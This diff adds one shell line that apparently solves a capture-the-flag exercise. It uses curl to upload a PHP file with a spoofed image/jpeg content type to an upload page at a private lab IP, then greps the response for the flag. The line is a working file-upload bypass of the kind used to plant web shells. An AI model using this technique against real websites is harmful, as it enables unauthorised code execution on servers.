@@ -1,0 +1,1 @@
+curl -X POST -F 'Upload=Upload' -F 'uploaded=@upload.php;type=image/jpeg' http://192.168.8.5/index.php\?page\=upload\ | grep "flag"
